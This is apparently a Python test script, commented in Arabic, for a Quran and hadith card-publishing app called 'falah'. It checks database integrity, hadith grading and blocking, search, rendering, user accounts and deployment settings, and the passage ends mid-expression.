#!/usr/bin/env python3
"""اختبارات طبقة المحتوى. تُشغَّل بلا خادم: python3 tests.py"""
import sqlite3, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from falah.text import fingerprint, searchable, search_variants
from falah.matn import matn_sane
from falah.reconcile import orthographic_key
from falah import verify as V
import api

DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "falah.db")
c = sqlite3.connect(f"file:{DB}?mode=ro", uri=True); c.row_factory = sqlite3.Row

def _try_err(fn, exc):
    """يعيد True إن رفع الاستدعاءُ الخطأَ المتوقَّع."""
    try:    fn(); return False
    except exc: return True

fails = []
def check(name, cond, note=""):
    print(("  ✓ " if cond else "  ✗ ") + name + (f"  ({note})" if note else ""))
    if not cond: fails.append(name)

print("\n▸ سلامة القاعدة")
n = c.execute("SELECT COUNT(*) FROM ayat").fetchone()[0]
check("القرآن كامل ٦٢٣٦ آية", n == 6236, n)
check("١١٤ سورة", c.execute("SELECT COUNT(*) FROM surahs").fetchone()[0] == 114)
check("لكل آية تفسير", c.execute("SELECT COUNT(*) FROM ayah_tafsir").fetchone()[0] == 6236)
check("لكل آية ترجمة", c.execute("SELECT COUNT(*) FROM ayah_translation").fetchone()[0] == 6236)
check("لا آية بلا بصمة", c.execute("SELECT COUNT(*) FROM ayat WHERE fingerprint IS NULL").fetchone()[0] == 0)

print("\n▸ صحة البصمة — قفل المصدر")
r = c.execute("SELECT text,fingerprint FROM ayat WHERE surah=94 AND ayah=5").fetchone()
check("البصمة تُعاد بنفس القيمة", fingerprint(r["text"]) == r["fingerprint"])
check("حذف حرف واحد يكسر البصمة", fingerprint(r["text"][:-1]) != r["fingerprint"])
check("زيادة تشكيل تكسر البصمة", fingerprint(r["text"] + "ً") != r["fingerprint"])
check("الفراغ الزائد لا يكسرها", fingerprint("  " + r["text"] + "  ") == r["fingerprint"])

print("\n▸ مواضع الآيات مقابل المصحف")
for s, a, page, juz in [(94,5,596,30), (2,286,49,3), (13,28,252,13), (65,2,558,28), (1,1,1,1)]:
    row = c.execute("SELECT page,juz FROM ayat WHERE surah=? AND ayah=?", (s,a)).fetchone()
    check(f"{s}:{a} صفحة {page} جزء {juz}", row["page"]==page and row["juz"]==juz,
          f"وجد {row['page']}/{row['juz']}")

print("\n▸ فصل المتن عن السند")
h = c.execute("""SELECT h.* FROM hadiths h JOIN books b ON b.id=h.book_id
                 WHERE b.code='bukhari' AND h.number_in_book=1""").fetchone()
check("متن حديث النية مستخرج", bool(h["matn"]) and "انما الاعمال" in searchable(h["matn"]))
check("السند لم يدخل المتن", "حدثنا" not in searchable(h["matn"] or ""))
check("الراوي: عمر بن الخطاب", h["narrator_ar"] == "عمر بن الخطاب", h["narrator_ar"])
check("السند الكامل محفوظ", "حدثنا" in searchable(h["full_ar"]))
cov = c.execute("SELECT COUNT(*) FROM hadiths WHERE matn IS NOT NULL").fetchone()[0]
tot = c.execute("SELECT COUNT(*) FROM hadiths").fetchone()[0]
check("تغطية فصل المتن فوق ٨٠٪", cov/tot > 0.80, f"{cov*100//tot}%")

print("\n▸ التحقق المزدوج للقرآن")
bad = c.execute("""SELECT COUNT(*) FROM ayat WHERE surah NOT IN (1,9) AND ayah=1
                   AND plain LIKE 'بسم الله الرحمن الرحيم%'""").fetchone()[0]
check("لا بسملة مُلحقة بأول أي سورة", bad == 0, bad)
strip = c.execute("SELECT COUNT(*) FROM ayat WHERE basmala_stripped=1").fetchone()[0]
check("نُزعت من ١١٢ سورة", strip == 112, strip)
conf = c.execute("SELECT COUNT(*) FROM ayat WHERE verify_status='conflict'").fetchone()[0]
check("الاختلافات مع المصدر الثاني محصورة", conf <= 5, conf)
leak = c.execute("SELECT COUNT(*) FROM ayat WHERE card_ok=1 AND verify_status='conflict'").fetchone()[0]
check("لا آية مختلَف فيها تُفرَج", leak == 0, leak)
sec = c.execute("SELECT COUNT(*) FROM ayat WHERE text_secondary IS NULL").fetchone()[0]
check("لكل آية نظير من المصدر الثاني", sec == 0, sec)
row = c.execute("SELECT text,text_secondary FROM ayat WHERE surah=13 AND ayah=28").fetchone()
check("مفتاح الرسم يوحّد الطبعتين",
      orthographic_key(row["text"]) == orthographic_key(row["text_secondary"]))

print("\n▸ قاعدة الدرجات")
check("البخاري: صحيح بشرطه",
      c.execute("SELECT grade FROM hadiths WHERE book_id=1 LIMIT 1").fetchone()[0] == "صحيح")
sch = c.execute("SELECT COUNT(*) FROM hadiths WHERE grade_source='scholar'").fetchone()[0]
check("أحكام محدِّثين مسمَّين مُسندة", sch > 15000, sch)
noby = c.execute("SELECT COUNT(*) FROM hadiths WHERE grade_source='scholar' AND grade_by IS NULL").fetchone()[0]
check("كل حكم محدِّث باسم قائله", noby == 0, noby)
weak = c.execute("""SELECT COUNT(*) FROM hadiths WHERE card_ok=1
                    AND grade NOT IN ('صحيح','حسن','حسن صحيح','صحيح لغيره','حسن لغيره',
                                      'إسناده صحيح','إسناده حسن')""").fetchone()[0]
check("لا حديث ضعيف فما دون يُفرَج", weak == 0, weak)
nog = c.execute("SELECT COUNT(*) FROM hadiths WHERE card_ok=1 AND grade IS NULL").fetchone()[0]
check("لا حديث بلا حكم يُفرَج", nog == 0, nog)
unc = c.execute("SELECT COUNT(*) FROM hadiths WHERE card_ok=1 AND verify_status<>'confirmed'").fetchone()[0]
check("كل مُفرَج تأكّد من مصدر ثانٍ", unc == 0, unc)
inv = c.execute("SELECT COUNT(*) FROM hadiths WHERE grade IS NOT NULL AND grade_basis IS NULL").fetchone()[0]
check("لا درجة بلا مستند", inv == 0)

print("\n▸ سلامة المتون المُفرَج عنها")
sample = c.execute("""SELECT b.code,h.number_in_book,h.matn,h.matn_conf FROM hadiths h
                      JOIN books b ON b.id=h.book_id WHERE h.card_ok=1
                      ORDER BY RANDOM() LIMIT 400""").fetchall()
bad = [(r["code"], r["number_in_book"], matn_sane(r["matn"])[1]) for r in sample
       if not matn_sane(r["matn"])[0]]
check("٤٠٠ متن عشوائي كلها سليمة", not bad, bad[:2])
lowc = sum(1 for r in sample if r["matn_conf"] < 0.95)
check("كلها من علامة الطبعة لا التخمين", lowc == 0, lowc)
# فحص على مستوى الكلمة لكل متن مُفرَج — لا LIKE يخلط «وَيْلٌ» بواو العطف
allm = c.execute("SELECT matn FROM hadiths WHERE card_ok=1").fetchall()
bad_all = [r["matn"] for r in allm if not matn_sane(r["matn"])[0]]
check(f"كل المتون المُفرَج عنها ({len(allm)}) تجتاز حارس السلامة",
      not bad_all, bad_all[:1])

print("\n▸ طابور المراجعة")
rq = c.execute("SELECT COUNT(*) FROM review_queue").fetchone()[0]
check("كل محجوب مسجَّل بسببه", rq > 1000, rq)
noreason = c.execute("SELECT COUNT(*) FROM review_queue WHERE reason IS NULL OR reason=''").fetchone()[0]
check("لا حجب بلا سبب مذكور", noreason == 0, noreason)
blocked_no_reason = c.execute("SELECT COUNT(*) FROM hadiths WHERE card_ok=0 AND block_reason IS NULL").fetchone()[0]
check("كل حديث محجوب له سبب", blocked_no_reason == 0, blocked_no_reason)

print("\n▸ شاهد الجامع الكامل")
jw = c.execute("SELECT COUNT(*) FROM hadiths WHERE jami_vol IS NOT NULL").fetchone()[0]
check("الجامع الكامل شهد لآلاف الأحاديث", jw > 10000, jw)
jc = c.execute("SELECT COUNT(*) FROM hadiths WHERE jami_vol IS NOT NULL AND card_ok=1").fetchone()[0]
check("منها ضمن البطاقات", jc > 5000, jc)
nob = c.execute("SELECT COUNT(*) FROM hadiths WHERE jami_vol IS NOT NULL AND jami_hits<2").fetchone()[0]
check("لا شهادة دون عتبة المقاطع", nob == 0, nob)
row = c.execute("""SELECT h.jami_vol,h.jami_book,h.jami_hits FROM hadiths h JOIN books b ON b.id=h.book_id
                   WHERE b.code='bukhari' AND h.number_in_book=1""").fetchone()
check("حديث النية شهد له الأعظمي", row["jami_vol"] is not None,
      f"مج{row['jami_vol']} · {row['jami_book']} · {row['jami_hits']} مقاطع")
# النص لا يُؤخذ من الجامع أبدًا — نتأكد أن لا عمود نصّي منه
cols = [r[1] for r in c.execute("PRAGMA table_info(hadiths)")]
check("لا نصَّ مخزَّنًا من الجامع الكامل",
      not any(x.startswith("jami_") and x.endswith(("text","matn")) for x in cols))
bab = c.execute("SELECT COUNT(*) FROM hadiths WHERE jami_bab IS NOT NULL").fetchone()[0]
check("بابُ الأعظمي مستخرج", bab > 10000, bab)
tk = c.execute("SELECT COUNT(*) FROM hadiths WHERE jami_takhrij IS NOT NULL").fetchone()[0]
check("تخريج الأعظمي مستخرج", tk > 10000, tk)
pol = dict(c.execute("SELECT jami_polarity,COUNT(*) FROM hadiths WHERE jami_vol IS NOT NULL GROUP BY 1").fetchall())
check("أحكام الكتاب مصنَّفة إيجابًا وسلبًا", pol.get("positive",0) > 5000 and pol.get("negative",0) > 0, pol)
leak = c.execute("""SELECT COUNT(*) FROM hadiths WHERE card_ok=1 AND jami_polarity='negative'""").fetchone()[0]
check("لا حديث تحفّظ عليه الأعظمي يُفرَج", leak == 0, leak)
conf = c.execute("SELECT COUNT(*) FROM hadiths WHERE block_reason LIKE 'تعارض%'").fetchone()[0]
check("التعارض بين الأحكام يُحجب ويُسجَّل", conf > 0, conf)
jg = c.execute("SELECT COUNT(*) FROM hadiths WHERE grade_source='jami' AND grade_basis IS NULL").fetchone()[0]
check("حكم الأعظمي مقرونٌ بمستنده", jg == 0, jg)
src_j = c.execute("SELECT kind,license_status FROM sources WHERE code='jami.kamil'").fetchone()
check("مسجَّل في السجل بدوره الصحيح", src_j and src_j["kind"] == "hadith-witness", dict(src_j) if src_j else None)

print("\n▸ التخريج المتقاطع والمتشابه")
g = c.execute("SELECT COUNT(DISTINCT group_key) FROM takhrij").fetchone()[0]
check("مجموعات تخريج متقاطع موجودة", g > 500, g)
m = c.execute("SELECT COUNT(*) FROM ayat WHERE mutashabih_group IS NOT NULL").fetchone()[0]
check("المتشابه اللفظي مُعلَّم", m > 100, m)

print("\n▸ البحث")
def count(tbl, term):
    for q in search_variants(term):
        n = c.execute(f"SELECT COUNT(*) FROM {tbl} WHERE {tbl} MATCH ?", (q,)).fetchone()[0]
        if n: return n, q
    return 0, None
def finds(term, surah, ayah):
    for q in search_variants(term):
        hit = c.execute("""SELECT 1 FROM ayat_fts f JOIN ayat a ON a.id=f.rowid
                           WHERE ayat_fts MATCH ? AND a.surah=? AND a.ayah=?""",
                        (q, surah, ayah)).fetchone()
        if hit: return True, q
    return False, None
ok,q = finds("الصبر", 2, 153);  check("«الصبر» تجد البقرة ١٥٣", ok, q)
ok,q = finds("بالصبر", 103, 3); check("«بالصبر» تجد العصر ٣", ok, q)
ok,q = finds("صبر", 2, 153);    check("«صبر» بلا أداة تجدها أيضًا", ok, q)
n,q = count("hadith_fts","النية"); check("البحث في الحديث يجد «النية»", n > 5, f"{n} عبر {q}")
n,q = count("hadith_fts","النصيحة"); check("«النصيحة» في الحديث", n > 3, f"{n} عبر {q}")

print("\n▸ محرّك الفحوص الـ٢٥")
it, ctx = api.quran_card(c, 94, 5, 6, True, True)
rep = V.run(it, ctx)
check("عدد الفحوص ٢٥ بالضبط", rep["total"] == 25, rep["total"])
check("خمس مراحل", len(rep["stages"]) == 5)
check("آية سليمة تجتاز الكل", rep["ok"], f"{rep['passed']}/25 — {rep['failed']}")
check("خانات الشريط العلوي أربع", len(it["cells"]) == 4)
check("الشريط يحمل السورة والصفحة", "الشرح" in searchable(it["cells"]["c1"][0]) and "٥٩٦" in it["cells"]["c3"][0])

it2, ctx2 = api.hadith_card(c, "bukhari", 1)
rep2 = V.run(it2, ctx2)
check("حديث الصحيحين يجتاز", rep2["ok"], f"{rep2['passed']}/25 — {rep2['failed']}")
check("التخريج المتقاطع مذكور", len(it2["takhrij"]) >= 1, it2["takhrij"][:2])

row = c.execute("""SELECT b.code,h.number_in_book FROM hadiths h JOIN books b ON b.id=h.book_id
                   WHERE h.card_ok=1 AND h.grade_source='scholar' LIMIT 1""").fetchone()
it3, ctx3 = api.hadith_card(c, row["code"], row["number_in_book"])
rep3 = V.run(it3, ctx3)
check("حديث بحكم محدِّث يجتاز", rep3["ok"], f"{rep3['passed']}/25 — {rep3['failed']}")
check("اسم المحكِّم مذكور", bool(it3["grade_by"]), it3["grade_by"])

row = c.execute("""SELECT b.code,h.number_in_book FROM hadiths h JOIN books b ON b.id=h.book_id
                   WHERE h.grade IS NULL AND h.matn IS NOT NULL LIMIT 1""").fetchone()
it4b, ctx4b = api.hadith_card(c, row["code"], row["number_in_book"])
check("حديث بلا حكم يسقط", not V.run(it4b, ctx4b)["ok"])

# آية مكرّرة لفظًا: تُنشر لأن موضعها مطبوعٌ ومواضعها الأخرى مصرَّحٌ بها
row = c.execute("SELECT surah,ayah FROM ayat WHERE mutashabih_group IS NOT NULL LIMIT 1").fetchone()
it4, ctx4 = api.quran_card(c, row["surah"], row["ayah"])
rep4 = V.run(it4, ctx4)
check("المتشابه يُنشر بموضعه ومواضعه الأخرى مصرَّحًا بها",
      rep4["ok"] and it4.get("mutashabih") and it4["cells"]["c4"][0] and it4["cells"]["c1"][0],
      f"{row['surah']}:{row['ayah']} → {it4.get('mutashabih')}")
# فإن غاب التصريح عاد الحجب: الالتباس أن يُنشر بلا موضع
ctx4b_ = dict(ctx4); ctx4b_["mutashabih_disclosed"] = False
check("بلا تصريحٍ بالمواضع يُوقف الإنتاج", not V.run(it4, ctx4b_)["ok"])

print("\n▸ القرّاء والتلاوات")
from falah.audio import audio_url
nr = c.execute("SELECT COUNT(*) FROM reciters").fetchone()[0]
check("قرّاء مسجَّلون", nr >= 15, nr)
riw = c.execute("SELECT COUNT(DISTINCT riwayah) FROM reciters").fetchone()[0]
check("أكثر من رواية", riw >= 2, riw)
r = c.execute("SELECT * FROM reciters WHERE code='alafasy'").fetchone()
u = audio_url(r["scheme"], r["folder"], 1, 1, 1)
check("رابط التلاوة يُبنى صحيحًا", u.endswith("001001.mp3") and u.startswith("https://"), u)
dup = c.execute("SELECT COUNT(*) FROM (SELECT folder FROM reciters GROUP BY folder HAVING COUNT(*)>1)").fetchone()[0]
check("لا تكرار في مجلدات القرّاء", dup == 0, dup)

print("\n▸ الموسوعة الحديثية — الشرح والترجمة")
ne = c.execute("SELECT COUNT(*) FROM enc").fetchone()[0]
check("أحاديث الموسوعة محمّلة", ne > 3000, ne)
sh = c.execute("SELECT COUNT(*) FROM enc WHERE explanation IS NOT NULL AND explanation<>''").fetchone()[0]
check("لكل حديث شرح", sh == ne, f"{sh}/{ne}")
gr = c.execute("SELECT COUNT(*) FROM enc WHERE grade IS NULL OR grade=''").fetchone()[0]
check("لا حديث بلا درجة", gr == 0, gr)
at = c.execute("SELECT COUNT(*) FROM enc WHERE attribution IS NULL OR attribution=''").fetchone()[0]
check("لكل حديث تخريج", at == 0, at)
lk = c.execute("SELECT COUNT(DISTINCT enc_id) FROM enc_link").fetchone()[0]
check("ربطٌ بالكتب التسعة", lk > 300, lk)
tr = c.execute("SELECT COUNT(*) FROM enc_tr").fetchone()[0]
check("ترجمات محمّلة", tr > 1000, tr)
bad = c.execute("""SELECT COUNT(*) FROM enc WHERE card_ok=1 AND grade NOT IN
                   ('صحيح','حسن','حسن صحيح','صحيح لغيره','حسن لغيره','إسناده صحيح','إسناده حسن')""").fetchone()[0]
check("لا حديث ضعيف من الموسوعة يُفرَج", bad == 0, bad)
row = c.execute("SELECT id FROM enc WHERE card_ok=1 AND id IN (SELECT enc_id FROM enc_link) LIMIT 1").fetchone()
it5, ctx5 = api.enc_card(c, row["id"])
rep5 = V.run(it5, ctx5)
check("بطاقة الموسوعة تجتاز الـ٢٥", rep5["ok"], f"{rep5['passed']}/25 — {rep5['failed']}")
check("الشرح مُسند لمصدره", bool(it5["sharh"]["source"]), it5["sharh"]["source"])
check("المتن مفصول عن مقدمة الراوي",
      "عن" not in (it5["text"] or "")[:4] and bool(it5["intro"]), it5["intro"][:40])

print("\n▸ نظافة النص")
bad = c.execute("SELECT COUNT(*) FROM ayat WHERE text LIKE '%'||char(8207)||'%'").fetchone()[0]
check("لا محارف اتجاه في القرآن", bad == 0, bad)
low = c.execute("SELECT COUNT(*) FROM ayat WHERE char_len<1").fetchone()[0]
check("لا آية فارغة", low == 0)
# طه ونٓ ويس آياتٌ قصيرة صحيحة — تُقبل ولا تُعدّ خللًا
short = c.execute("SELECT surah,ayah,text FROM ayat WHERE char_len<4").fetchall()
check("الآيات القصيرة كلها فواتح سور (حروف مقطعة)",
      all(r["ayah"] == 1 for r in short),
      [(r["surah"],r["ayah"],r["text"]) for r in short])

print("\n▸ محرّك التصيير")
import render as R, os
check("الخطوط محلّية موجودة", all(os.path.exists(os.path.join(R.FONTS,f))
      for f in ("Amiri-Regular.ttf","Amiri-Bold.ttf","AmiriQuran.ttf")))
check("أربعة مقاسات — ومنها ٤:٥ الأعلى وصولًا في إنستقرام",
      set(R.SIZES) == {"square","portrait","vertical","wide"}
      and R.SIZES["portrait"] == (1080, 1350), list(R.SIZES.values()))
check("ثلاثة أشكال", set(R.SKINS) == {"night","parch","ivory"})
card, rep = R.fetch_card("quran", surah=94, ayah=5, to=6)
html = R.build_html(card, "quran", "night", "square", "قناتك")
check("القالب يحمل النص والخانات الأربع",
      card["text"][:12] in html and all(card["cells"][k][0] in html for k in ("c1","c2","c3","c4")))
check("الخط مدمج في الصفحة لا مُحمَّل من الشبكة",
      "@font-face" in html and "base64" in html and "http" not in html.split("<body>")[0].replace("http-equiv",""))
check("لا يُصيَّر إلا ما اجتاز الفحص", rep["ok"], f"{rep['passed']}/{rep['total']}")
blk = c.execute("""SELECT b.code, h.number_in_book FROM hadiths h JOIN books b ON b.id=h.book_id
                   WHERE h.card_ok=0 AND h.matn IS NOT NULL LIMIT 1""").fetchone()
try:
    R.fetch_card("hadith", book=blk["code"], no=blk["number_in_book"]); ok_block = False
except SystemExit: ok_block = True
check("المحجوب يرفض التصيير", ok_block, f"{blk['code']} {blk['number_in_book']}")
# القاعدة والمحرّك يجب أن يتفقا على كل بطاقة، وإلا صُدِّر محجوب
rows = c.execute("""SELECT b.code,h.number_in_book,h.card_ok FROM hadiths h
                    JOIN books b ON b.id=h.book_id WHERE h.matn IS NOT NULL
                    ORDER BY RANDOM() LIMIT 500""").fetchall()
mis = []
for x in rows:
    it_, cx_ = api.hadith_card(c, x["code"], x["number_in_book"])
    if V.run(it_, cx_)["ok"] != bool(x["card_ok"]):
        mis.append((x["code"], x["number_in_book"], x["card_ok"]))
check("القاعدة والمحرّك متفقان على ٥٠٠ بطاقة", not mis, mis[:2])

print("\n▸ السلسلة")
import carousel as CR
P = CR.plan(topic=1, kind="mixed", count=4)
check("السلسلة تُبنى من موضوع", len(P["cards"]) >= 2, len(P["cards"]))
check("كل بطاقة في السلسلة اجتازت الفحص كاملًا",
      all(r["ok"] and r["passed"] == r["total"] for _, _, r, _ in P["cards"]))
check("السلسلة المختلطة تُنوّع بين آيةٍ وحديث",
      len({k for k, *_ in P["cards"]}) == 2, [k for k, *_ in P["cards"]])
cap = P["caption"]
check("الوصف يذكر مرجع كل بطاقة",
      all(CR.ref_line(cd) in cap for _, cd, _, _ in P["cards"]))
check("الوصف يذكر المصادر", all(x in cap for x in P["sources"]))
# لا حكم بلا نسبة، حتى في سطر الوصف
bad = [CR.sanad_line(cd) for k, cd, _, _ in P["cards"]
       if k != "quran" and cd.get("grade") and not (cd.get("grade_by") or cd.get("grade_basis"))]
check("لا درجة في الوصف بلا نسبةٍ لقائلها", not bad, bad)
# الغلاف والخاتمة لا يحملان نصًّا شرعيًّا
cover = CR.R.build_cover_html(P["title"], P["title_en"], "سلسلة", ["س"], "night", "square")
body_cover = cover.split("</style>")[1]
check("الغلاف خالٍ من النصّ الشرعي",
      not any(cd["text"][:14] in body_cover for _, cd, _, _ in P["cards"]))
end = CR.R.build_end_html("المصادر", P["sources_slide"], "ملاحظة", "night", "square")
check("الخاتمة تعرض أسماء المصادر", all(x in end for x in P["sources_slide"]))
check("رقم الشريحة يظهر في الذيل", "٢ / ٦" in
      CR.R.build_html(P["cards"][0][1], "quran", "night", "square", "قناتك", badge="٢ / ٦"))
# ما رسب يُذكر ولا يُستبدل
Pd = CR.plan(items="hadith:bukhari:%d" % (c.execute(
     "SELECT h.number_in_book FROM hadiths h JOIN books b ON b.id=h.book_id "
     "WHERE b.code='bukhari' AND h.card_ok=0 AND h.matn IS NOT NULL LIMIT 1").fetchone()[0],)
     + ",quran:94:5:6")
check("المحجوب يسقط من السلسلة بسببٍ مذكور",
      len(Pd["dropped"]) == 1 and len(Pd["cards"]) == 1, Pd["dropped"])

print("\n▸ هيكل التطبيق: الحساب والمشروع")
import tempfile, json as _json
from falah import store as ST, auth as AU, projects as PJ
ST.APP_DB = os.path.join(tempfile.mkdtemp(), "app.db")
ac = ST.init()

uid = AU.register(ac, " Daood@Example.COM ", "kalimat-sirr-1", "داوود", "قناة فلاح")
row = ac.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()
check("البريد يُطبَّع قبل الحفظ", row["email"] == "daood@example.com", row["email"])
check("كلمة المرور لا تُحفظ نصًّا", b"kalimat-sirr-1" not in bytes(row["pw_hash"]) and
      b"kalimat-sirr-1" not in bytes(row["pw_salt"]))
check("لكل حساب ملحه", AU.hash_password("x")[1] != AU.hash_password("x")[1])
weak = [AU.password_problem(x) for x in ("1234", "password", " kalimat ")]
check("كلمات المرور الضعيفة تُرفض", all(weak))

tok, u = AU.login(ac, "daood@example.com", "kalimat-sirr-1")
sess = ac.execute("SELECT token_hash FROM sessions").fetchone()["token_hash"]
check("رمز الجلسة يُحفظ مجزَّأً لا خامًا", tok not in sess and len(sess) == 64)
check("الجلسة تُعرِّف صاحبها", AU.session_user(ac, tok)["id"] == uid)
check("رمز مزوَّر لا يفتح", AU.session_user(ac, tok[:-1] + ("a" if tok[-1] != "a" else "b")) is None)
try:  AU.login(ac, "daood@example.com", "kalimat-sirr-2"); bad = False
except AU.AuthError: bad = True
check("كلمة خاطئة تُرفض", bad)
try:  AU.login(ac, "ghost@example.com", "kalimat-sirr-1"); msg1 = ""
except AU.AuthError as e: msg1 = str(e)
try:  AU.login(ac, "daood@example.com", "kalimat-sirr-9"); msg2 = ""
except AU.AuthError as e: msg2 = str(e)
check("رسالة الخطأ لا تكشف وجود الحساب", msg1 == msg2 and msg1 != "", (msg1, msg2))
for _ in range(AU.MAX_TRIES + 1):
    try: AU.login(ac, "daood@example.com", "خطأ")
    except AU.AuthError as e: last = str(e)
check("المحاولات المتكرّرة تُحبس", "محاولات كثيرة" in last, last)
AU.clear(ac, "login:daood@example.com"); ac.commit()

tok2, _ = AU.login(ac, "daood@example.com", "kalimat-sirr-1")
AU.change_password(ac, uid, "kalimat-sirr-1", "kalimat-sirr-3")
check("تغيير كلمة المرور يُنهي كل الجلسات",
      AU.session_user(ac, tok) is None and AU.session_user(ac, tok2) is None)
tok, _ = AU.login(ac, "daood@example.com", "kalimat-sirr-3")

pid = PJ.create(ac, uid, "سلسلة اليسر", "series", "night", "square", "قناة فلاح")
PJ.add_item(ac, c, uid, pid, "quran", {"surah": 94, "ayah": 5, "to": 6})
PJ.add_item(ac, c, uid, pid, "hadith", {"book": "bukhari", "no": 69})
try:  PJ.add_item(ac, c, uid, pid, "hadith", {"book": "bukhari", "no": 69}); dup = False
except PJ.ProjectError: dup = True
check("لا يتكرّر النصّ في المشروع", dup)
blk = c.execute("""SELECT b.code,h.number_in_book n FROM hadiths h JOIN books b ON b.id=h.book_id
                   WHERE h.card_ok=0 AND h.matn IS NOT NULL LIMIT 1""").fetchone()
try:  PJ.add_item(ac, c, uid, pid, "hadith", {"book": blk["code"], "no": blk["n"]}); gate = False
except PJ.ProjectError: gate = True
check("المحجوب لا يدخل المشروع أصلًا", gate)

st = PJ.open_project(ac, c, uid, pid)
check("المشروع يُفتح بعناصره مفحوصةً الآن",
      st["exportable"] and all(i["state"] == "ok" for i in st["items"]), len(st["items"]))
check("المشروع لا يخزّن نصًّا بل إشارةً وبصمة",
      all("text" not in _json.loads(r["ref"]) for r in
          ac.execute("SELECT ref FROM project_items WHERE project_id=?", (pid,))))

# قفل المصدر ممتدًّا للمشروع: بصمةٌ مغايرة ← انحراف يمنع التصدير
first = ac.execute("SELECT id,fp FROM project_items WHERE project_id=? ORDER BY pos", (pid,)).fetchone()
ac.execute("UPDATE project_items SET fp='0'*32 WHERE id=?", (first["id"],)); ac.commit()
st2 = PJ.open_project(ac, c, uid, pid)
check("تغيّر نصّ المصدر يُكشف ويمنع التصدير",
      st2["drift"] == [first["id"]] and not st2["exportable"],
      [i["state"] for i in st2["items"]])
PJ.accept_drift(ac, c, uid, pid, first["id"])
st3 = PJ.open_project(ac, c, uid, pid)
check("الموافقة الصريحة تُعيد الاعتماد", st3["exportable"] and not st3["drift"])
check("الموافقة تُسجَّل في السجلّ",
      ac.execute("SELECT COUNT(*) n FROM events WHERE action='drift_accepted'").fetchone()["n"] == 1)

other = AU.register(ac, "other@example.com", "kalimat-sirr-2")
try:  PJ.open_project(ac, c, other, pid); leak = True
except PJ.ProjectError: leak = False
check("لا يرى مستخدمٌ مشروع غيره", not leak)
check("قائمة المشاريع معزولة لكل حساب",
      len(PJ.listing(ac, uid)) == 1 and PJ.listing(ac, other) == [])
AU.logout(ac, tok)
check("الخروج يُبطل الجلسة", AU.session_user(ac, tok) is None)

print("\n▸ إعداد الإنتاج")
import importlib, subprocess, gzip, shutil, tempfile as _tf
os.environ["FALAH_SECURE"] = "1"; os.environ["FALAH_ORIGIN"] = "https://falah.example.com"
import app as APP; importlib.reload(APP)
ck = APP.App.set_cookie(None, "TOK")[0][1]
check("الكعكة محميّة بالكامل خلف HTTPS",
      all(x in ck for x in ("HttpOnly", "SameSite=Strict", "Secure", "Path=/")), ck[:70])
class _H:
    def __init__(self, h): self.h = h
    def get(self, k, d=None): return self.h.get(k, d)
def _guard(hdrs):
    o = type("X", (), {"headers": _H(hdrs)})()
    return APP.App.guard_csrf(o)
check("بلا ترويسة التطبيق يسقط الطلب", not _guard({}))
check("من نطاقٍ غريب يسقط الطلب",
      not _guard({"X-FALAH": "1", "Origin": "https://evil.example"}))
check("من نطاق التطبيق يمرّ",
      _guard({"X-FALAH": "1", "Origin": "https://falah.example.com"}))
os.environ.pop("FALAH_SECURE"); os.environ.pop("FALAH_ORIGIN"); importlib.reload(APP)
check("بلا HTTPS لا تُوسم الكعكة Secure", "Secure" not in APP.App.set_cookie(None, "T")[0][1])

# النسخ الاحتياطي يُنتج قاعدةً تُقرأ
bk = _tf.mkdtemp()
env = dict(os.environ, FALAH_APP_DB=ST.APP_DB)
subprocess.run(["sh", "deploy/backup.sh", bk, "3"], check=True, env=env,
               stdout=subprocess.DEVNULL)
gz = [x for x in os.listdir(bk) if x.endswith(".gz")]
shutil.copyfileobj(gzip.open(os.path.join(bk, gz[0])), open(os.path.join(bk, "r.db"), "wb"))
rc = sqlite3.connect(os.path.join(bk, "r.db"))
check("النسخة الاحتياطية تُستعاد بمستخدميها",
      rc.execute("SELECT COUNT(*) FROM users").fetchone()[0] >= 2)
rc.close()

# ملفات النشر موجودة ومتّسقة
dep = open("deploy/docker-compose.yml", encoding="utf-8").read()
check("النشر يمرّر النطاق والكعكة الآمنة للتطبيق",
      "FALAH_SECURE" in dep and "FALAH_ORIGIN" in dep and "falah-data:/data" in dep)
_dock = open("Dockerfile", encoding="utf-8").read()
check("الحاوية تحمل ffmpeg وكروميوم للتصدير",
      all(x in _dock for x in ("ffmpeg", "playwright install chromium")))
check("الحاوية تحمل العاملَ نفسه", "worker.py" in _dock)
# الخادم يقدّم هذه الملفّات؛ غيابُها عن الصورة يعني ٤٠٤ في الإنتاج وحده
check("الحاوية تحمل ما يقدّمه الخادم من ملفّات ثابتة",
      all(x in _dock for x in ("manifest.webmanifest", "sw.js", "icons/")))
check("العامل خدمةٌ مستقلّة عن الخادم في النشر",
      "worker:" in dep and "worker.py" in dep and 'FALAH_INLINE_WORKER: "0"' in dep)
# **بالخدمة لا بالعدد.** كان الفحصُ `count(...) == 2`، فلمّا أُضيفت خدمةُ
# النسخ الاحتياطيّ — وهي تقرأ القاعدةَ بحقّ — سقط الاختبارُ بلا عيب. والعدُّ
# يجيب «كم مرّة» والسؤالُ «أيُّ خدمة»، فيُسأل ما نعنيه.
_svc = {}
for _blk in __import__("re").split(r"\n  (?=\w)", dep):
    _nm = _blk.strip().split(":")[0]
    if _nm:
        _svc[_nm] = _blk
check("الخادم والعامل يتقاسمان الطابور ومجلّد الصادرات",
      all("falah-data:/data" in _svc.get(s, "") and
          "falah-exports:/app/exports" in _svc.get(s, "")
          for s in ("app", "worker")), str(sorted(_svc)))
check("والنسخُ الاحتياطيُّ خدمةٌ تُقلع لا سطرٌ في cron يُنسى",
      "backup:" in dep and "falah-backups:/backups" in dep)
check("وله فحصُ صحّةٍ يكشف خدمةً تعمل ولا تنسخ",
      "app-*.db.gz' -mmin" in dep)
check("الصادرات على حجمٍ يبقى بعد تحديث الصورة", "falah-exports:" in dep.split("volumes:")[-1])
# بناءُ الصورة يتحقّق من نفسه — وإلّا خرجت صورةٌ بقاعدةٍ فارغةٍ أو لا تقلع،
# ولا يُعلَم إلا في الإنتاج. (وهذا الملفُّ نفسُه لا يجري داخل الصورة: هو
# يفحص المستودعَ لا الصورة — يقرأ `Dockerfile` و`ci.yml` و`.gitignore`.)
_vi = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "verify_image.py"), encoding="utf-8").read()
check("بناءُ الصورة يتحقّق من نفسه قبل أن تُختم",
      "verify_image.py" in _dock and "python3 verify_image.py" in _dock)
check("والتحقّقُ يشمل سلامةَ قاعدة المحتوى وامتلاءها",
      "integrity_check" in _vi and "MIN_AYAT = 6236" in _vi
